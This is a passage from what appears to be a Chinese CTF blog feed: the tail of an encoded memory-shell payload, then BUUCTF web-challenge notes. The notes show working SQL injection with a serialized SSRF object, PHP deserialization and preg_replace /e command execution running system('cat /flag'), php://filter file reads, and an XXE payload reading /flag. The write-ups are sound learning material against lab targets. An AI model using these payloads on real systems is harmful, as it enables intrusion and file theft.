class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>c5<span class="hljs-symbol">$</span><span class="hljs-number">5</span>c5b<span class="hljs-symbol">$</span>ce<span class="hljs-symbol">$</span>deH<span class="hljs-symbol">$</span><span class="hljs-number">7</span>e<span class="hljs-symbol">$</span><span class="hljs-number">9</span>a<span class="hljs-symbol">$</span>a3<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>f6Fo<span class="hljs-symbol">$</span>q<span class="hljs-symbol">$</span><span class="hljs-number">3</span>f<span class="hljs-symbol">$</span>d3<span class="hljs-symbol">$</span>Tua<span class="hljs-symbol">$</span>f4<span class="hljs-symbol">$</span><span class="hljs-number">5</span>c<span class="hljs-symbol">$</span><span class="hljs-number">7</span>f<span class="hljs-symbol">$</span>e6<span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span>c70<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span><span class="hljs-number">81</span><span class="hljs-symbol">$</span>f3<span class="hljs-symbol">$</span>a9<span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>f7c<span class="hljs-symbol">$</span>a9s<span class="hljs-symbol">$</span>e6<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>bcy<span class="hljs-symbol">$</span><span class="hljs-number">3</span>d<span class="hljs-symbol">$</span>db<span class="hljs-symbol">$</span>T<span class="hljs-symbol">$</span>da<span class="hljs-symbol">$</span>d3<span class="hljs-symbol">$</span>D<span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>_A<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>e7<span class="hljs-symbol">$</span><span class="hljs-number">96</span><span class="hljs-symbol">$</span><span class="hljs-number">8</span>d<span class="hljs-symbol">$</span>w<span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span>d4<span class="hljs-symbol">$</span>b9T<span class="hljs-symbol">$</span>b27<span class="hljs-symbol">$</span><span class="hljs-number">91</span><span class="hljs-symbol">$</span><span class="hljs-number">3</span>acF<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a4<span class="hljs-symbol">$</span>ce<span class="hljs-symbol">$</span>a7<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-number">40</span><span class="hljs-symbol">$</span>daE<span class="hljs-symbol">$</span><span class="hljs-number">3</span>e<span class="hljs-symbol">$</span><span class="hljs-number">5</span>c<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span><span class="hljs-number">91</span><span class="hljs-symbol">$</span><span class="hljs-number">7</span>c<span class="hljs-symbol">$</span>Z<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>e7G<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>a5<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>Qi<span class="hljs-symbol">$</span>d5W<span class="hljs-symbol">$</span>ec<span class="hljs-symbol">$</span>r<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span><span class="hljs-number">7</span>ee<span class="hljs-symbol">$</span>f4r<span class="hljs-symbol">$</span>ear<span class="hljs-symbol">$</span>eaRo<span class="hljs-symbol">$</span><span class="hljs-number">7</span>b<span class="hljs-symbol">$</span>f2Un<span class="hljs-symbol">$</span>ffH<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>a3WRW<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>f4ye<span class="hljs-symbol">$</span>f4<span class="hljs-symbol">$</span><span class="hljs-number">85</span><span class="hljs-symbol">$</span>d4<span class="hljs-symbol">$</span>V<span class="hljs-symbol">$</span>eeN<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>ccO<span class="hljs-symbol">$</span><span class="hljs-number">5</span>e<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>d1<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span><span class="hljs-number">80</span><span class="hljs-symbol">$</span>K<span class="hljs-symbol">$</span>z<span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span>q<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>af<span class="hljs-symbol">$</span>jO<span class="hljs-symbol">$</span><span class="hljs-number">5e7</span><span class="hljs-symbol">$</span>b6<span class="hljs-symbol">$</span><span class="hljs-number">5</span>cM<span class="hljs-symbol">$</span><span class="hljs-number">5</span>d5<span class="hljs-symbol">$</span>ea<span class="hljs-symbol">$</span><span class="hljs-number">5</span>eM<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span><span class="hljs-number">9</span>f<span class="hljs-symbol">$</span>e8i<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span><span class="hljs-number">81</span>T<span class="hljs-symbol">$</span>K<span class="hljs-symbol">$</span>xR<span class="hljs-symbol">$</span>_P<span class="hljs-symbol">$</span>f8<span class="hljs-symbol">$</span>eaw<span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span><span class="hljs-number">8</span>d<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>f2<span class="hljs-symbol">$</span>c6c<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span><span class="hljs-number">7</span>cK<span class="hljs-symbol">$</span><span class="hljs-number">5</span>e<span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>M<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>v<span class="hljs-symbol">$</span>fc<span class="hljs-symbol">$</span><span class="hljs-number">9</span>c<span class="hljs-symbol">$</span><span class="hljs-number">96</span><span class="hljs-symbol">$</span><span class="hljs-number">97</span><span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span><span class="hljs-number">8</span>c<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span>e7<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span><span class="hljs-number">94</span><span class="hljs-symbol">$</span>f3rK<span class="hljs-symbol">$</span><span class="hljs-number">922</span><span class="hljs-symbol">$</span>G<span class="hljs-symbol">$</span>q<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span><span class="hljs-number">95</span>KR<span class="hljs-symbol">$</span>B<span class="hljs-symbol">$</span>b4<span class="hljs-symbol">$</span>be<span class="hljs-symbol">$</span>q<span class="hljs-symbol">$</span>_HUR<span class="hljs-symbol">$</span>d2<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>abr<span class="hljs-symbol">$</span>I<span class="hljs-symbol">$</span>I<span class="hljs-symbol">$</span>bd<span class="hljs-symbol">$</span>x<span class="hljs-symbol">$</span><span class="hljs-number">9</span>f<span class="hljs-symbol">$</span><span class="hljs-number">91</span><span class="hljs-symbol">$</span>f7<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span>f2<span class="hljs-symbol">$</span>Bv<span class="hljs-symbol">$</span><span class="hljs-number">7</span>d<span class="hljs-symbol">$</span>I<span class="hljs-symbol">$</span>d4<span class="hljs-symbol">$</span><span class="hljs-number">7</span>eW<span class="hljs-symbol">$</span><span class="hljs-number">5</span>e<span class="hljs-symbol">$</span><span class="hljs-number">96</span><span class="hljs-symbol">$</span><span class="hljs-number">7</span>f<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>cf<span class="hljs-symbol">$</span>cb<span class="hljs-symbol">$</span>f7D<span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span>f7<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span>V<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>b8<span class="hljs-symbol">$</span>bcj<span class="hljs-symbol">$</span><span class="hljs-number">5</span>d<span class="hljs-symbol">$</span><span class="hljs-number">96</span><span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span>ac<span class="hljs-symbol">$</span>X<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span><span class="hljs-number">9</span>a<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>b2<span class="hljs-symbol">$</span><span class="hljs-number">5</span>c<span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>ae<span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>a4<span class="hljs-symbol">$</span>dc<span class="hljs-symbol">$</span>b0V<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span>N<span class="hljs-symbol">$</span>x<span class="hljs-symbol">$</span><span class="hljs-number">947</span><span class="hljs-symbol">$</span>ad<span class="hljs-symbol">$</span>a6<span class="hljs-symbol">$</span><span class="hljs-number">8</span>cX_<span class="hljs-symbol">$</span>BY<span class="hljs-symbol">$</span><span class="hljs-number">7</span>fS<span class="hljs-symbol">$</span>d2<span class="hljs-symbol">$</span>d6_H<span class="hljs-symbol">$</span>c6<span class="hljs-symbol">$</span>faK<span class="hljs-symbol">$</span>c9Z<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span>y<span class="hljs-symbol">$</span>b6<span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>b3<span class="hljs-symbol">$</span>feC<span class="hljs-symbol">$</span>f2<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span><span class="hljs-number">7</span>f<span class="hljs-symbol">$</span>B<span class="hljs-symbol">$</span>ba<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>b5u<span class="hljs-symbol">$</span>ae<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span><span class="hljs-number">3</span>e<span class="hljs-symbol">$</span>a8OY<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-number">8</span>e<span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span><span class="hljs-number">85</span><span class="hljs-symbol">$</span><span class="hljs-number">97</span><span class="hljs-symbol">$</span>ac<span class="hljs-symbol">$</span><span class="hljs-number">7</span>f<span class="hljs-symbol">$</span><span class="hljs-number">95</span>Qh<span class="hljs-symbol">$</span>JX<span class="hljs-symbol">$</span><span class="hljs-number">5</span>b<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span>u_<span class="hljs-symbol">$</span><span class="hljs-number">90</span><span class="hljs-symbol">$</span>b7<span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span><span class="hljs-number">98</span><span class="hljs-symbol">$</span>dc<span class="hljs-symbol">$</span>b2<span class="hljs-symbol">$</span><span class="hljs-number">3</span>e<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span>b716<span class="hljs-symbol">$</span>mw<span class="hljs-symbol">$</span>ad<span class="hljs-symbol">$</span>ef<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span><span class="hljs-number">8</span>fc<span class="hljs-symbol">$</span>ec<span class="hljs-symbol">$</span>b8T<span class="hljs-symbol">$</span>aco<span class="hljs-symbol">$</span>cb<span class="hljs-symbol">$</span>X1vB<span class="hljs-symbol">$</span>aa<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>d7<span class="hljs-symbol">$</span><span class="hljs-number">60</span><span class="hljs-symbol">$</span>d1<span class="hljs-symbol">$</span><span class="hljs-number">5</span>b2<span class="hljs-symbol">$</span>u<span class="hljs-symbol">$</span>z<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>ab2<span class="hljs-symbol">$</span><span class="hljs-number">8</span>e<span class="hljs-symbol">$</span>b1<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>bck<span class="hljs-symbol">$</span>ed<span class="hljs-symbol">$</span>cb<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>dcFR<span class="hljs-symbol">$</span>bco<span class="hljs-symbol">$</span>ed<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>qf<span class="hljs-symbol">$</span><span class="hljs-number">87</span><span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span>D<span class="hljs-symbol">$</span>e8X<span class="hljs-symbol">$</span><span class="hljs-number">92</span><span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span><span class="hljs-number">87</span><span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span><span class="hljs-number">98</span>LalX<span class="hljs-symbol">$</span>bek<span class="hljs-symbol">$</span>e5<span class="hljs-symbol">$</span>e1<span class="hljs-symbol">$</span><span class="hljs-number">89</span><span class="hljs-symbol">$</span><span class="hljs-number">5</span>b<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>d1<span class="hljs-symbol">$</span>f7<span class="hljs-symbol">$</span>acWe<span class="hljs-symbol">$</span>gcg<span class="hljs-symbol">$</span>e4<span class="hljs-symbol">$</span>fb<span class="hljs-symbol">$</span>d0m<span class="hljs-symbol">$</span>G<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>ce<span class="hljs-symbol">$</span>c2<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span><span class="hljs-number">94</span>Y<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span><span class="hljs-number">8</span>b<span class="hljs-symbol">$</span>ffM<span class="hljs-symbol">$</span>e6<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>ee<span class="hljs-symbol">$</span><span class="hljs-number">3</span>cl<span class="hljs-symbol">$</span><span class="hljs-number">7</span>d<span class="hljs-symbol">$</span>m<span class="hljs-symbol">$</span>f3X<span class="hljs-symbol">$</span><span class="hljs-number">97</span><span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>b4<span class="hljs-symbol">$</span>Pd<span class="hljs-symbol">$</span>B<span class="hljs-symbol">$</span>ef<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>c0<span class="hljs-symbol">$</span>eeo<span class="hljs-symbol">$</span>c8<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span>de<span class="hljs-symbol">$</span><span class="hljs-number">5</span>d<span class="hljs-symbol">$</span><span class="hljs-number">84</span><span class="hljs-symbol">$</span>f5<span class="hljs-symbol">$</span>ef<span class="hljs-symbol">$</span>c9<span class="hljs-symbol">$</span><span class="hljs-number">3</span>d<span class="hljs-symbol">$</span>bc<span class="hljs-symbol">$</span>bb<span class="hljs-symbol">$</span>E<span class="hljs-symbol">$</span>lte<span class="hljs-symbol">$</span>J<span class="hljs-symbol">$</span><span class="hljs-number">3</span>b<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>c3<span class="hljs-symbol">$</span>T<span class="hljs-symbol">$</span>be<span class="hljs-symbol">$</span>yKY<span class="hljs-symbol">$</span>ae<span class="hljs-symbol">$</span>c0<span class="hljs-symbol">$</span>l<span class="hljs-symbol">$</span>f7<span class="hljs-symbol">$</span>f1sG<span class="hljs-symbol">$</span><span class="hljs-number">5</span>e<span class="hljs-symbol">$</span><span class="hljs-number">80</span>W<span class="hljs-symbol">$</span>e6e<span class="hljs-symbol">$</span>F<span class="hljs-symbol">$</span>ebR<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>cd<span class="hljs-symbol">$</span>eb<span class="hljs-symbol">$</span>b2<span class="hljs-symbol">$</span><span class="hljs-number">8</span>a<span class="hljs-symbol">$</span>b1<span class="hljs-symbol">$</span>ab<span class="hljs-symbol">$</span><span class="hljs-number">88</span><span class="hljs-symbol">$</span><span class="hljs-number">86</span><span class="hljs-symbol">$</span>c0BK<span class="hljs-symbol">$</span>d6<span class="hljs-symbol">$</span>f0<span class="hljs-symbol">$</span>bbnb<span class="hljs-symbol">$</span>f9<span class="hljs-symbol">$</span>ce<span class="hljs-symbol">$</span>ff<span class="hljs-symbol">$</span>C<span class="hljs-symbol">$</span><span class="hljs-number">81</span>E<span class="hljs-symbol">$</span>G<span class="hljs-symbol">$</span><span class="hljs-number">5</span>bA<span class="hljs-symbol">$</span>o<span class="hljs-symbol">$</span>A<span class="hljs-symbol">$</span>A</code></pre></div><p>用这个去替换掉driver里的内容</p><p><img src="/2023/09/10/sictf2023/image-20230917113039223.png" alt="image-20230917113039223"></p><p><img src="/2023/09/10/sictf2023/image-20230917113101312.png" alt="image-20230917113101312"></p><p>成功回显</p><p>呜呜，有点激动，第一次复现出内存马的题（虽然对内存马还一无所知），要加快学习进度了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯2023</title>
    <link href="/2023/09/10/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/"/>
    <url>/2023/09/10/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Buu刷题</title>
    <link href="/2023/09/08/Buu%E5%88%B7%E9%A2%98/"/>
    <url>/2023/09/08/Buu%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>注册个用户后，点开发现url，<code>no=1</code>，<code>’</code>尝试报错，成功报错，于是SQL注入</p><p>本来想着读username、passwd去登陆，但没什么用，读data发现反序列化数据</p><p>。。。然后就不会了</p><p>看WP，robots.txt有提示，下载源码，虽然有isValidBlog，但其实没什么用</p><p>直接序列化ssrf的数据</p><p>然后union all select 1,2,3,4，放入第四个位置（对应blog，能够反序列化的地方）</p><div class="code-wrapper"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;</code></pre></div><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>放入burp中，等一会就会截取到</p><p>发现两个参数，修改func，会发现回调函数报错，尝试system,报错hacker</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=readfile&amp;p=index。php</code></pre></div><p>读取index.php，发现禁用的函数名，并且有</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;         <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;             <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);         &#125;     &#125; &#125; <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>]; <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>]; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;     <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;         <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);     &#125;<span class="hljs-keyword">else</span> &#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);     &#125; &#125; <span class="hljs-meta">?&gt;</span></code></pre></div><p>然后不会了，。。。。。</p><p>看WP，使用unserialize()，并自行构造发序列化数据</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;         <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;             <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);         &#125; &#125; <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>(); <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);</code></pre></div><p>但找不到flag</p><p>构造<code>find / -name flag</code></p><p>找到flag，然后读取即可</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>点开按钮，查看url，可能存在任意文件读取，尝试index.php，不行，加个php:&#x2F;&#x2F;filter过滤器</p><p>成功读取，关键代码<code>include($_GET[’category‘].&#39;php&#39;)</code></p><p>只有三个文件可利用，于是想到<code>filterchain</code></p><p><img src="/2023/09/08/Buu%E5%88%B7%E9%A2%98/image-20230908114051163.png" alt="image-20230908114051163"></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>先data:&#x2F;&#x2F;伪协议满足判断，然后读取next.php，回显输入的内容，感觉不对，加个php:&#x2F;&#x2F;filter伪协议，成功读取，</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,        <span class="hljs-variable">$str</span>    );&#125;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&#125;</code></pre></div><p>一眼preg_replace的&#x2F;e，存在漏洞，<code>strtolower(&quot;\\1&quot;)</code>的意思自行查找</p><p>要在next.php下加参数</p><div class="code-wrapper"><pre><code class="hljs bash">/next.php?\S*=&#123;<span class="hljs-variable">$&#123;getFlag()&#125;</span>&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat%20/flag&#x27;</span>);</code></pre></div><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>一看就要套娃</p><p>进去找不到文件。。。。。</p><p>小看一眼WP，<code>.git</code>泄露</p><p>代码审计一看就是无参数RCE</p><p>列目录</p><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())));</span></code></pre></div><p>flag.php在倒数第二个</p><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))));</span></code></pre></div><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>登陆界面抓包，很明显，直接XXE</p><p>尝试直接读取<code>/flag</code>，成功</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">TEST</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/flag&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>遇到这种题就头大，但是这考的比较简单</p><p>是一个网页，点什么都没用，在最后面发现输出了dog，感觉有点问题，但是找不到文件</p><p>小看一眼wp，又是<code>.git</code>泄露，但好像说不稳定，要多试几次</p><div class="code-wrapper"><pre><code class="hljs awk">&lt;?phpinclude <span class="hljs-string">&#x27;flag.php&#x27;</span>;<span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　　    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>  ;  <span class="hljs-regexp">//</span>post 声明至当前文件&#125;foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　     $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;  <span class="hljs-regexp">//</span>GET型变量重新赋值为当前文件变量中以其值为键名的值&#125;foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span 